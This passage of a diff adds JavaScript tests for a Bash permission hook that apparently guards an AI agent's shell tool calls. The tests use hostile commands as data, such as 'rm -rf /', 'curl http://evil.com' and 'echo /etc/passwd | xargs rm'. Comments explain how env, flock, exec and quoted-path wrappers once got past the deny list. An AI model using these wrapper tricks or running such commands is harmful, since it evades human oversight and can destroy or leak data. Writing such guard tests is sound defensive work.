     // \` should not be treated as a backtick delimiter
     const subs = extractSubshells('echo \\`not a subshell\\`');
-    const hasNot = subs.some(s => s.includes('not a subshell'));
-    assert.ok(!hasNot, 'escaped backticks must not be treated as subshell delimiters');
+    const hasNot = subs.some((s) => s.includes('not a subshell'));
+    assert.ok(
+      !hasNot,
+      'escaped backticks must not be treated as subshell delimiters',
+    );
   });
 
   test('extractSubshells handles backtick inside single quotes', () => {
     // backtick inside single quotes is literal, not a subshell
     const subs = extractSubshells("echo 'foo `bar` baz'");
-    const hasBar = subs.some(s => s.includes('bar'));
-    assert.ok(!hasBar, 'backticks inside single quotes must not be treated as subshell delimiters');
+    const hasBar = subs.some((s) => s.includes('bar'));
+    assert.ok(
+      !hasBar,
+      'backticks inside single quotes must not be treated as subshell delimiters',
+    );
   });
 
   test('extractSubshells handles backtick inside double quotes', () => {
     // backtick inside double quotes IS a subshell in real bash
     // but for safety, we should still extract and check its contents
     const subs = extractSubshells('echo "result: `whoami`"');
-    assert.ok(subs.some(s => s.includes('whoami')), 'backtick inside double quotes should be extracted');
+    assert.ok(
+      subs.some((s) => s.includes('whoami')),
+      'backtick inside double quotes should be extracted',
+    );
   });
 
   test('echo $(echo ")"; rm -rf /) is NOT auto-approved', () => {
     const settings = { permissions: { allow: [], deny: [] } };
     const result = decide('echo $(echo ")"; rm -rf /)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'must not auto-approve when subshell has unallowed commands past quoted )');
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'must not auto-approve when subshell has unallowed commands past quoted )',
+    );
+  });
+});
+
+// ── detectForcedPromptPattern ────────────────────────────────────────────────
+
+describe('BASH-HOOK-FORCED-PROMPT: detectForcedPromptPattern', () => {
+  test('flags $(...) command substitution', () => {
+    const result = detectForcedPromptPattern('echo $(date)');
+    assert.ok(result, 'must flag $(...)');
+    assert.match(result.pattern, /\$\(\.\.\.\)/);
+    assert.match(result.snippet, /\$\(date\)/);
+  });
+
+  test('flags backtick command substitution', () => {
+    const result = detectForcedPromptPattern('echo `pwd`');
+    assert.ok(result, 'must flag backticks');
+    assert.match(result.pattern, /backtick/);
+  });
+
+  test('flags ${VAR:-default} parameter expansion', () => {
+    const result = detectForcedPromptPattern('cd "${TMPDIR:-/tmp}"');
+    assert.ok(result, 'must flag :-');
+    assert.match(result.pattern, /parameter expansion/);
+    assert.match(result.snippet, /TMPDIR:-/);
+  });
+
+  test('flags ${VAR:+alt}, ${VAR:?err}, ${VAR:=assign} variants', () => {
+    assert.ok(detectForcedPromptPattern('echo "${X:+set}"'), ':+ should flag');
+    assert.ok(
+      detectForcedPromptPattern('echo "${X:?missing}"'),
+      ':? should flag',
+    );
+    assert.ok(
+      detectForcedPromptPattern('echo "${X:=default}"'),
+      ':= should flag',
+    );
+  });
+
+  test('does NOT flag plain $VAR', () => {
+    assert.equal(detectForcedPromptPattern('echo $HOME'), null);
+    assert.equal(detectForcedPromptPattern('cd $PWD'), null);
+  });
+
+  test('does NOT flag ${VAR} without operator', () => {
+    assert.equal(detectForcedPromptPattern('echo ${HOME}/file'), null);
+  });
+
+  test('does NOT flag special vars $$, $!, $?', () => {
+    assert.equal(detectForcedPromptPattern('echo $$'), null);
+    assert.equal(detectForcedPromptPattern('echo $!'), null);
+    assert.equal(detectForcedPromptPattern('echo $?'), null);
+  });
+
+  test("does NOT flag '$(...)' inside single quotes (literal text)", () => {
+    assert.equal(detectForcedPromptPattern("echo '$(literal)'"), null);
+  });
+
+  test("does NOT flag '`...`' inside single quotes (literal text)", () => {
+    assert.equal(detectForcedPromptPattern("echo '`literal`'"), null);
+  });
+
+  test('DOES flag $(...) inside double quotes (expansion happens)', () => {
+    assert.ok(detectForcedPromptPattern('echo "$(date)"'));
+  });
+
+  test('escape hatch GSD_HOOK_ALLOW_EXPANSION=1 disables detection', () => {
+    const prev = process.env.GSD_HOOK_ALLOW_EXPANSION;
+    process.env.GSD_HOOK_ALLOW_EXPANSION = '1';
+    try {
+      assert.equal(detectForcedPromptPattern('echo $(date)'), null);
+      assert.equal(detectForcedPromptPattern('cd "${TMPDIR:-/tmp}"'), null);
+      assert.equal(detectForcedPromptPattern('echo `pwd`'), null);
+    } finally {
+      if (prev === undefined) delete process.env.GSD_HOOK_ALLOW_EXPANSION;
+      else process.env.GSD_HOOK_ALLOW_EXPANSION = prev;
+    }
+  });
+
+  test('returns null for empty/non-string input', () => {
+    assert.equal(detectForcedPromptPattern(''), null);
+    assert.equal(detectForcedPromptPattern(null), null);
+    assert.equal(detectForcedPromptPattern(undefined), null);
+  });
+
+  test('decide() returns deny with helpful suggestion when forced-prompt pattern detected', () => {
+    const settings = { permissions: { allow: ['Bash(cat:*)'], deny: [] } };
+    const result = decide('cat "$(echo /tmp/foo)"', settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /expansion guard/i);
+    assert.match(result.reason, /Run the inner command in a prior Bash call/);
+    assert.match(result.reason, /GSD_HOOK_ALLOW_EXPANSION/);
+  });
+
+  // Regression: backslash-escaped expansions outside quotes are literal text in
+  // bash, not real command substitution / parameter expansion. The detector
+  // previously skipped escape handling outside quotes and falsely flagged them.
+  test('does NOT flag \\$(...) escaped command substitution outside quotes', () => {
+    assert.equal(detectForcedPromptPattern('echo \\$(date)'), null);
+    assert.equal(detectForcedPromptPattern('printf %s \\$(date)'), null);
+  });
+
+  test('does NOT flag \\` escaped backticks outside quotes', () => {
+    assert.equal(detectForcedPromptPattern('echo \\`pwd\\`'), null);
+  });
+
+  test('does NOT flag \\${...} escaped parameter expansion outside quotes', () => {
+    assert.equal(detectForcedPromptPattern('echo \\${TMPDIR:-/tmp}'), null);
+  });
+
+  test('still flags real expansion adjacent to escaped backslash (\\\\$(...))', () => {
+    // `\\$(date)` = literal backslash followed by REAL command substitution
+    assert.ok(detectForcedPromptPattern('echo \\\\$(date)'));
+  });
+});
+
+// ── hasNonQuantifierBraces: regex-quantifier carve-out ──────────────────────
+
+describe('BASH-HOOK-QUANTIFIER: hasNonQuantifierBraces', () => {
+  test('returns false for {N,M} regex quantifier', () => {
+    assert.equal(hasNonQuantifierBraces("'foo{0,80}bar'"), false);
+  });
+
+  test('returns false for {N} single number', () => {
+    assert.equal(hasNonQuantifierBraces("'a{42}'"), false);
+  });
+
+  test('returns false for {,M} max-only', () => {
+    assert.equal(hasNonQuantifierBraces("'x{,5}'"), false);
+  });
+
+  test('returns false for {N,} min-only', () => {
+    assert.equal(hasNonQuantifierBraces("'x{5,}'"), false);
+  });
+
+  test('returns false for empty {} (harmless)', () => {
+    assert.equal(hasNonQuantifierBraces("'x{}y'"), false);
+  });
+
+  test('returns true for awk inline script', () => {
+    assert.equal(hasNonQuantifierBraces("'{print $1}'"), true);
+  });
+
+  test('returns true for embedded JSON', () => {
+    assert.equal(hasNonQuantifierBraces('\'{"k":"v"}\''), true);
+  });
+
+  test('returns true for find/template placeholders', () => {
+    assert.equal(hasNonQuantifierBraces("'{name}'"), true);
+  });
+
+  test('returns true for brace expansion {a,b,c}', () => {
+    assert.equal(hasNonQuantifierBraces("'{a,b,c}'"), true);
+  });
+
+  test('returns true for unbalanced { with no matching }', () => {
+    assert.equal(hasNonQuantifierBraces("'{unclosed'"), true);
+  });
+
+  test('regex quantifier inside grep does NOT trigger forced-prompt detection', () => {
+    assert.equal(
+      detectForcedPromptPattern("grep -E 'foo{0,80}bar' /tmp/x"),
+      null,
+    );
+    assert.equal(detectForcedPromptPattern("sed -E 's/x{2,5}/y/' file"), null);
+  });
+
+  test('decide() ALLOWS regex quantifiers when grep is allowlisted', () => {
+    const settings = { permissions: { allow: ['Bash(grep:*)'], deny: [] } };
+    const result = decide("grep -E 'foo{0,80}bar' /tmp/x", settings);
+    assert.equal(result.decision, 'allow');
+  });
+
+  test('decide() still DENIES awk inline scripts (regex carve-out is precise)', () => {
+    const settings = { permissions: { allow: ['Bash(awk:*)'], deny: [] } };
+    const result = decide("awk '{print $1}' /tmp/x", settings);
+    assert.equal(result.decision, 'deny');
+  });
+});
+
+// ── detectForcedPromptPattern: obfuscation pattern (single-quoted braces) ───
+
+describe('BASH-HOOK-OBFUSCATION: single-quoted brace detection', () => {
+  test("flags awk '{...}' inline scripts", () => {
+    const result = detectForcedPromptPattern("awk '{print $1}' /tmp/foo");
+    assert.ok(result, 'must flag single-quoted braces');
+    assert.match(result.pattern, /obfuscation/);
+    assert.match(result.suggestion, /awk -f|jq -f|--data-file=/);
+  });
+
+  test('flags echo \'{"json":1}\' embedded JSON args', () => {
+    const result = detectForcedPromptPattern('echo \'{"key":"val"}\'');
+    assert.ok(result, 'must flag single-quoted JSON');
+  });
+
+  test("flags find . -name '{name}' brace patterns", () => {
+    const result = detectForcedPromptPattern("find . -name '{name}'");
+    assert.ok(result, 'must flag single-quoted brace patterns');
+  });
+
+  test('does NOT flag single-quoted strings WITHOUT braces', () => {
+    assert.equal(detectForcedPromptPattern("jq '.foo.bar' /tmp/data"), null);
+    assert.equal(detectForcedPromptPattern("grep 'pattern' /tmp/file"), null);
+    assert.equal(
+      detectForcedPromptPattern("sed 's/old/new/g' /tmp/file"),
+      null,
+    );
+  });
+
+  test('does NOT flag braces OUTSIDE single quotes', () => {
+    // ${VAR} without operator is fine (caught by other guards if needed,
+    // but plain braces in command text are not obfuscation).
+    assert.equal(detectForcedPromptPattern('echo ${HOME}'), null);
+  });
+
+  test('decide() denies obfuscation pattern with workaround suggestion', () => {
+    const settings = { permissions: { allow: ['Bash(awk:*)'], deny: [] } };
+    const result = decide("awk '{print $1}' /tmp/foo", settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /obfuscation/);
+    assert.match(result.reason, /Write tool/);
+  });
+
+  test('escape hatch GSD_HOOK_ALLOW_EXPANSION=1 disables obfuscation detection', () => {
+    const prev = process.env.GSD_HOOK_ALLOW_EXPANSION;
+    process.env.GSD_HOOK_ALLOW_EXPANSION = '1';
+    try {
+      assert.equal(detectForcedPromptPattern("awk '{print $1}'"), null);
+    } finally {
+      if (prev === undefined) delete process.env.GSD_HOOK_ALLOW_EXPANSION;
+      else process.env.GSD_HOOK_ALLOW_EXPANSION = prev;
+    }
+  });
+});
+
+// ── Wrapper bypass guard ─────────────────────────────────────────────────────
+
+describe('BASH-HOOK-WRAPPER: extractWrappedCommand strips wrappers', () => {
+  test('env FOO=bar curl -> "curl"', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO=bar curl http://x'),
+      'curl http://x',
+    );
+  });
+
+  test('env -i -u VAR FOO=bar cmd -> "cmd"', () => {
+    assert.equal(
+      extractWrappedCommand('env -i -u OLD FOO=bar cmd arg'),
+      'cmd arg',
+    );
+  });
+
+  test('timeout 10s curl -> "curl"', () => {
+    assert.equal(
+      extractWrappedCommand('timeout 10s curl http://x'),
+      'curl http://x',
+    );
+  });
+
+  test('timeout -k 5 -s 9 30 cmd -> "cmd"', () => {
+    assert.equal(
+      extractWrappedCommand('timeout -k 5 -s 9 30 cmd arg'),
+      'cmd arg',
+    );
+  });
+
+  test('xargs rm -> "rm"', () => {
+    assert.equal(extractWrappedCommand('xargs rm'), 'rm');
+  });
+
+  test('xargs -I {} -n 1 -P 4 rm -rf {} -> "rm"', () => {
+    const result = extractWrappedCommand('xargs -I {} -n 1 -P 4 rm -rf');
+    // -I value, -n value, -P value all skipped; rm is wrapped cmd
+    assert.equal(result, 'rm -rf');
+  });
+
+  test('nohup cmd -> "cmd"', () => {
+    assert.equal(extractWrappedCommand('nohup ./run.sh arg'), './run.sh arg');
+  });
+
+  test('nice -n 10 cmd -> "cmd"', () => {
+    assert.equal(extractWrappedCommand('nice -n 10 cmd arg'), 'cmd arg');
+  });
+
+  test('non-wrapper returns null', () => {
+    assert.equal(extractWrappedCommand('echo hello'), null);
+    assert.equal(extractWrappedCommand('git status'), null);
+  });
+
+  test('sudo intentionally NOT in wrapper set (privilege escalation)', () => {
+    assert.ok(!WRAPPER_COMMANDS.has('sudo'));
+    assert.equal(extractWrappedCommand('sudo rm -rf /'), null);
+  });
+
+  test('decide(): env wrapper bypass is BLOCKED — wrapped curl must also match', () => {
+    // env+echo allowlisted but curl is NOT
+    const settings = {
+      permissions: { allow: ['Bash(env:*)', 'Bash(echo:*)'], deny: [] },
+    };
+    const result = decide('env FOO=bar curl http://evil.com', settings);
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'env wrapper must NOT silently approve a non-allowlisted wrapped command',
+    );
+  });
+
+  test('decide(): timeout wrapper bypass is BLOCKED', () => {
+    const settings = {
+      permissions: { allow: ['Bash(timeout:*)', 'Bash(echo:*)'], deny: [] },
+    };
+    const result = decide('timeout 10s curl http://evil.com', settings);
+    assert.notEqual(result.decision, 'allow');
+  });
+
+  test('decide(): xargs wrapper bypass is BLOCKED', () => {
+    const settings = {
+      permissions: { allow: ['Bash(xargs:*)', 'Bash(echo:*)'], deny: [] },
+    };
+    const result = decide('echo /etc/passwd | xargs rm', settings);
+    assert.notEqual(result.decision, 'allow');
+  });
+
+  test('decide(): legitimate wrapper use ALLOWED when both wrapper + wrapped allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)', 'Bash(echo:*)'], deny: [] },
+    };
+    const result = decide('env FOO=bar echo hello', settings);
+    assert.equal(result.decision, 'allow');
+  });
+
+  // Regression: env's `--` end-of-options marker and the GNU combined
+  // short-flag form (-uVAR / -CDIR) were not stripped, so the wrapped
+  // command was returned with leftover env flags as its first token —
+  // breaking the allowlist match for the wrapped command.
+  test('env -- git status -> "git status" (-- ends option parsing)', () => {
+    assert.equal(extractWrappedCommand('env -- git status'), 'git status');
+  });
+
+  test('env -uOLD git status -> "git status" (combined short-flag form)', () => {
+    assert.equal(extractWrappedCommand('env -uOLD git status'), 'git status');
+  });
+
+  test('env -CDIR git status -> "git status" (combined -C form)', () => {
+    assert.equal(extractWrappedCommand('env -CDIR git status'), 'git status');
+  });
+
+  test('env --unset=OLD git status -> "git status" (long --opt=val form)', () => {
+    assert.equal(
+      extractWrappedCommand('env --unset=OLD git status'),
+      'git status',
+    );
+  });
+
+  test('decide(): env -- git status ALLOWED when env+git allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)', 'Bash(git:*)'], deny: [] },
+    };
+    assert.equal(decide('env -- git status', settings).decision, 'allow');
+  });
+
+  test('decide(): env -uOLD git status ALLOWED when env+git allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)', 'Bash(git:*)'], deny: [] },
+    };
+    assert.equal(decide('env -uOLD git status', settings).decision, 'allow');
+  });
+
+  // Regression: flock has a -c <shell-string> form whose value is a single
+  // shell-quoted argument that spans multiple whitespace-tokens. The previous
+  // token-walk returned the leading `-c "curl evil"` (quotes leaked) — the
+  // wrapped curl was never surfaced and the deny-first check missed it. Fix
+  // uses a shell-aware regex extraction on the original cmd string.
+  test('flock /tmp/lock -c "curl evil.com" -> "curl evil.com" (-c shell-string)', () => {
+    assert.equal(
+      extractWrappedCommand('flock /tmp/lock -c "curl evil.com"'),
+      'curl evil.com',
+    );
+  });
+
+  test('flock -c "curl x" /tmp/lock -> "curl x" (-c before file)', () => {
+    assert.equal(
+      extractWrappedCommand('flock -c "curl x" /tmp/lock'),
+      'curl x',
+    );
+  });
+
+  test("flock /tmp/lock -c 'curl evil' -> \"curl evil\" (single-quoted -c)", () => {
+    assert.equal(
+      extractWrappedCommand("flock /tmp/lock -c 'curl evil'"),
+      'curl evil',
+    );
+  });
+
+  test('flock /tmp/lock --command "curl x" -> "curl x" (long --command form)', () => {
+    assert.equal(
+      extractWrappedCommand('flock /tmp/lock --command "curl x"'),
+      'curl x',
+    );
+  });
+
+  test('flock -w 5 /tmp/lock -c "curl x" -> "curl x" (option before file + -c)', () => {
+    assert.equal(
+      extractWrappedCommand('flock -w 5 /tmp/lock -c "curl x"'),
+      'curl x',
+    );
+  });
+
+  test('flock /tmp/lock git status -> "git status" (argv form preserved)', () => {
+    assert.equal(
+      extractWrappedCommand('flock /tmp/lock git status'),
+      'git status',
+    );
+  });
+
+  test('flock 9 cmd arg -> "cmd arg" (FD form preserved)', () => {
+    assert.equal(extractWrappedCommand('flock 9 cmd arg'), 'cmd arg');
+  });
+
+  test('decide(): flock -c bypass BLOCKED — wrapped curl matches deny', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash(flock:*)'],
+        deny: ['Bash(curl:*)'],
+      },
+    };
+    const result = decide(
+      'flock /tmp/lock -c "curl evil.com"',
+      settings,
+    );
+    assert.equal(
+      result.decision,
+      'deny',
+      'flock -c must NOT silently approve a deny-listed wrapped command',
+    );
+    assert.match(result.reason, /curl/);
+  });
+
+  test('decide(): flock -c "git status" ALLOWED when flock+git allowlisted', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash(flock:*)', 'Bash(git:*)'],
+        deny: [],
+      },
+    };
+    assert.equal(
+      decide('flock /tmp/lock -c "git status"', settings).decision,
+      'allow',
+    );
+  });
+
+  test('decide(): flock argv form ALLOWED when flock+git allowlisted', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash(flock:*)', 'Bash(git:*)'],
+        deny: [],
+      },
+    };
+    assert.equal(
+      decide('flock /tmp/lock git status', settings).decision,
+      'allow',
+    );
+  });
+
+  // Regression: taskset has two CLI shapes — command-launch (wraps a cmd) and
+  // pid-mode (operates on an existing PID, no wrapped cmd). The previous
+  // option-walk treated `-pc 0 1234` as `[options...] <mask> <cmd>` and
+  // returned `1234` (the PID) as a fake wrapped command, causing decide() to
+  // passthrough on `Bash(taskset:*)` allowlists because the bogus `1234`
+  // sub-command failed allowlist match. Pid mode now returns null.
+  test('taskset -pc 0 1234 -> null (pid mode, no wrapped cmd)', () => {
+    assert.equal(extractWrappedCommand('taskset -pc 0 1234'), null);
+  });
+
+  test('taskset -p 1234 -> null (bare pid mode)', () => {
+    assert.equal(extractWrappedCommand('taskset -p 1234'), null);
+  });
+
+  test('taskset --pid -c 0 1234 -> null (long --pid form)', () => {
+    assert.equal(extractWrappedCommand('taskset --pid -c 0 1234'), null);
+  });
+
+  test('taskset -pca 0 1234 -> null (combined -pca with --all-tasks)', () => {
+    assert.equal(extractWrappedCommand('taskset -pca 0 1234'), null);
+  });
+
+  test('taskset -c 0 git status -> "git status" (command-launch preserved)', () => {
+    assert.equal(
+      extractWrappedCommand('taskset -c 0 git status'),
+      'git status',
+    );
+  });
+
+  test('taskset 03 git status -> "git status" (mask-then-cmd preserved)', () => {
+    assert.equal(extractWrappedCommand('taskset 03 git status'), 'git status');
+  });
+
+  test('decide(): taskset pid-mode ALLOWED with only Bash(taskset:*)', () => {
+    const settings = {
+      permissions: { allow: ['Bash(taskset:*)'], deny: [] },
+    };
+    assert.equal(decide('taskset -pc 0 1234', settings).decision, 'allow');
+  });
+
+  test('decide(): taskset command-launch ALLOWED when taskset+git allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(taskset:*)', 'Bash(git:*)'], deny: [] },
+    };
+    assert.equal(
+      decide('taskset -c 0 git status', settings).decision,
+      'allow',
+    );
+  });
+
+  test('decide(): taskset command-launch DENIED when wrapped curl matches deny', () => {
+    const settings = {
+      permissions: { allow: ['Bash(taskset:*)'], deny: ['Bash(curl:*)'] },
+    };
+    const result = decide('taskset -c 0 curl evil.com', settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  // Regression: env assignments with quoted values containing whitespace
+  // (FOO="a b" or FOO='a b') were split across multiple whitespace-tokens,
+  // so the env option-walk stopped at the value-tail (`b"` / `b'`) and
+  // returned garbage. Detect an unbalanced opening quote on the value side
+  // of `=` and consume forward tokens until the matching closer.
+  test('env FOO="a b" git status -> "git status" (double-quoted value w/ space)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO="a b" git status'),
+      'git status',
+    );
+  });
+
+  test("env FOO='a b' git status -> \"git status\" (single-quoted value w/ space)", () => {
+    assert.equal(
+      extractWrappedCommand("env FOO='a b' git status"),
+      'git status',
+    );
+  });
+
+  test('env FOO="a b" BAR=baz git status -> "git status" (mixed assignments)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO="a b" BAR=baz git status'),
+      'git status',
+    );
+  });
+
+  test('env FOO="single-token" git status -> "git status" (balanced single-token quoted)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO="single-token" git status'),
+      'git status',
+    );
+  });
+
+  test('decide(): env FOO="a b" git status ALLOWED when env+git allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)', 'Bash(git:*)'], deny: [] },
+    };
+    assert.equal(
+      decide('env FOO="a b" git status', settings).decision,
+      'allow',
+    );
+  });
+
+  test('decide(): env FOO="a b" curl evil.com DENIED when curl in deny', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)'], deny: ['Bash(curl:*)'] },
+    };
+    const result = decide('env FOO="a b" curl evil.com', settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  // Regression: flock --command=<value> (and -c=<value>) wasn't matched by
+  // the shell-aware regex — only the space-separated form was. Extended the
+  // regex separator from `\s+` to `(?:\s+|=)`.
+  test('flock /tmp/lock --command="curl evil.com" -> "curl evil.com" (= form)', () => {
+    assert.equal(
+      extractWrappedCommand('flock /tmp/lock --command="curl evil.com"'),
+      'curl evil.com',
+    );
+  });
+
+  test("flock /tmp/lock --command='curl x' (= single-quoted) -> 'curl x'", () => {
+    assert.equal(
+      extractWrappedCommand("flock /tmp/lock --command='curl x'"),
+      'curl x',
+    );
+  });
+
+  test('flock /tmp/lock -c="curl x" -> "curl x" (short -c= form)', () => {
+    assert.equal(
+      extractWrappedCommand('flock /tmp/lock -c="curl x"'),
+      'curl x',
+    );
+  });
+
+  test('decide(): flock --command= bypass BLOCKED — wrapped curl matches deny', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash(flock:*)'],
+        deny: ['Bash(curl:*)'],
+      },
+    };
+    const result = decide(
+      'flock /tmp/lock --command="curl evil.com"',
+      settings,
+    );
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  test('decide(): flock --command="git status" ALLOWED when flock+git allowlisted', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash(flock:*)', 'Bash(git:*)'],
+        deny: [],
+      },
+    };
+    assert.equal(
+      decide('flock /tmp/lock --command="git status"', settings).decision,
+      'allow',
+    );
+  });
+
+  // Regression: env assignments with backslash-escaped whitespace in the
+  // value (e.g. `FOO=a\ b`) tokenize as `FOO=a\` then `b`. The plain-value
+  // branch consumed only the first token and `b` ended the option-walk
+  // (no `=`, not a flag), returning `b <wrapped...>` as garbage. Fix:
+  // detect a trailing unescaped backslash on the value-token and consume
+  // continuation tokens until the value no longer ends with one.
+  test('env FOO=a\\ b git status -> "git status" (escaped-space value)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO=a\\ b git status'),
+      'git status',
+    );
+  });
+
+  test('env FOO=a\\ b curl evil.com -> "curl evil.com" (escaped-space value)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO=a\\ b curl evil.com'),
+      'curl evil.com',
+    );
+  });
+
+  test('env FOO=a\\ b\\ c git status -> "git status" (multiple escaped spaces)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO=a\\ b\\ c git status'),
+      'git status',
+    );
+  });
+
+  test('env FOO=ab\\\\ git status -> "git status" (literal \\\\ trailing, no continuation)', () => {
+    // Even-count trailing backslashes are literal — value ends here, next
+    // token (`git`) is the wrapped command.
+    assert.equal(
+      extractWrappedCommand('env FOO=ab\\\\ git status'),
+      'git status',
+    );
+  });
+
+  test('decide(): env FOO=a\\ b git status ALLOWED when env+git allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)', 'Bash(git:*)'], deny: [] },
+    };
+    assert.equal(
+      decide('env FOO=a\\ b git status', settings).decision,
+      'allow',
+    );
+  });
+
+  test('decide(): env FOO=a\\ b curl evil.com DENIED when curl in deny', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)'], deny: ['Bash(curl:*)'] },
+    };
+    const result = decide('env FOO=a\\ b curl evil.com', settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  // Regression: exec is in WRAPPER_COMMANDS but had no option-walking
+  // branch — it fell through to the no-op tail. So `exec -a name git
+  // status` returned `-a name git status` as the wrapped command, the
+  // first word `-a` failed allowlist match, and the wrapped git was
+  // never surfaced to the deny-first check. Fix: add an exec branch
+  // that handles `-a NAME` (value-taking), `-c` / `-l` (boolean), the
+  // boolean combo `-cl`/`-lc`, and the trailing-`a` combo (`-cla NAME`).
+  test('exec -a name git status -> "git status"', () => {
+    assert.equal(
+      extractWrappedCommand('exec -a name git status'),
+      'git status',
+    );
+  });
+
+  test('exec -c git status -> "git status"', () => {
+    assert.equal(extractWrappedCommand('exec -c git status'), 'git status');
+  });
+
+  test('exec -l git status -> "git status"', () => {
+    assert.equal(extractWrappedCommand('exec -l git status'), 'git status');
+  });
+
+  test('exec -cl git status -> "git status" (combined boolean flags)', () => {
+    assert.equal(extractWrappedCommand('exec -cl git status'), 'git status');
+  });
+
+  test('exec -cla NAME git status -> "git status" (combo ending in -a)', () => {
+    assert.equal(
+      extractWrappedCommand('exec -cla NAME git status'),
+      'git status',
+    );
+  });
+
+  test('exec git status -> "git status" (no options preserved)', () => {
+    assert.equal(extractWrappedCommand('exec git status'), 'git status');
+  });
+
+  test('decide(): exec -a name git status ALLOWED when exec+git allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(exec:*)', 'Bash(git:*)'], deny: [] },
+    };
+    assert.equal(
+      decide('exec -a name git status', settings).decision,
+      'allow',
+    );
+  });
+
+  test('decide(): exec -c curl evil.com DENIED when curl in deny', () => {
+    const settings = {
+      permissions: { allow: ['Bash(exec:*)'], deny: ['Bash(curl:*)'] },
+    };
+    const result = decide('exec -c curl evil.com', settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  // Regression: env quoted-value parsing treated a token ending in `"` as
+  // balanced regardless of whether that quote was escaped. So
+  // `env FOO="a\" b" git status` (value = `a" b`) ended at token `FOO="a\"`
+  // — its trailing `"` is escaped (preceded by `\`), but the balanced check
+  // didn't notice. Forward consumption was inconsistent for the same reason.
+  // Fix: closer detection is now escape-aware for double quotes (count
+  // backslashes immediately before the trailing `"`; even = literal closer).
+  // Single quotes don't process escapes in shell, so plain endsWith still
+  // applies there.
+  test('env FOO="a\\" b" git status -> "git status" (escaped " inside double-quoted value)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO="a\\" b" git status'),
+      'git status',
+    );
+  });
+
+  test('env FOO="a\\" b" curl evil.com -> "curl evil.com" (escaped " + denylisted wrapped)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO="a\\" b" curl evil.com'),
+      'curl evil.com',
+    );
+  });
+
+  test('env FOO="a\\" b" BAR=baz git status -> "git status" (escaped " + chained assignment)', () => {
+    assert.equal(
+      extractWrappedCommand('env FOO="a\\" b" BAR=baz git status'),
+      'git status',
+    );
+  });
+
+  test('env FOO="a\\\\\\" b" git status -> "git status" (triple backslash: literal \\ then escaped ")', () => {
+    // value source: a\\\" b  →  shell sees: a, \\, \", space, b  →  value is `a\" b`
+    assert.equal(
+      extractWrappedCommand('env FOO="a\\\\\\" b" git status'),
+      'git status',
+    );
+  });
+
+  test('decide(): env FOO="a\\" b" git status ALLOWED when env+git allowlisted', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)', 'Bash(git:*)'], deny: [] },
+    };
+    assert.equal(
+      decide('env FOO="a\\" b" git status', settings).decision,
+      'allow',
+    );
+  });
+
+  test('decide(): env FOO="a\\" b" curl evil.com DENIED when curl in deny', () => {
+    const settings = {
+      permissions: { allow: ['Bash(env:*)'], deny: ['Bash(curl:*)'] },
+    };
+    const result = decide('env FOO="a\\" b" curl evil.com', settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  // Regression: WRAPPER_COMMANDS lookup did exact-match on the first
+  // whitespace-token. So `/usr/bin/env`, `"env"`, `'env'` all returned null
+  // from extractWrappedCommand, and the wrapped command was never surfaced
+  // to the deny-first check. A user who allowlisted `Bash(/usr/bin/env:*)`
+  // or `Bash("env":*)` could silently bypass wrapped-command checking.
+  // Fix: normalize the wrapper token (strip matching surrounding quotes,
+  // take basename if it contains `/`) before WRAPPER_COMMANDS lookup.
+  test('extractWrappedCommand recognizes /usr/bin/env (full path)', () => {
+    assert.equal(
+      extractWrappedCommand('/usr/bin/env FOO=bar curl evil.com'),
+      'curl evil.com',
+    );
+  });
+
+  test('extractWrappedCommand recognizes "env" (double-quoted name)', () => {
+    assert.equal(
+      extractWrappedCommand('"env" FOO=bar curl evil.com'),
+      'curl evil.com',
+    );
+  });
+
+  test("extractWrappedCommand recognizes 'env' (single-quoted name)", () => {
+    assert.equal(
+      extractWrappedCommand("'env' FOO=bar curl evil.com"),
+      'curl evil.com',
+    );
+  });
+
+  test('extractWrappedCommand recognizes "/usr/bin/env" (quoted full path)', () => {
+    assert.equal(
+      extractWrappedCommand('"/usr/bin/env" FOO=bar curl evil.com'),
+      'curl evil.com',
+    );
+  });
+
+  test('extractWrappedCommand recognizes /usr/bin/timeout (other wrapper via path)', () => {
+    assert.equal(
+      extractWrappedCommand('/usr/bin/timeout 10 curl evil.com'),
+      'curl evil.com',
+    );
+  });
+
+  test('decide(): /usr/bin/env path-allowlisted + curl in deny -> DENY', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash(/usr/bin/env:*)'],
+        deny: ['Bash(curl:*)'],
+      },
+    };
+    const result = decide(
+      '/usr/bin/env FOO=bar curl evil.com',
+      settings,
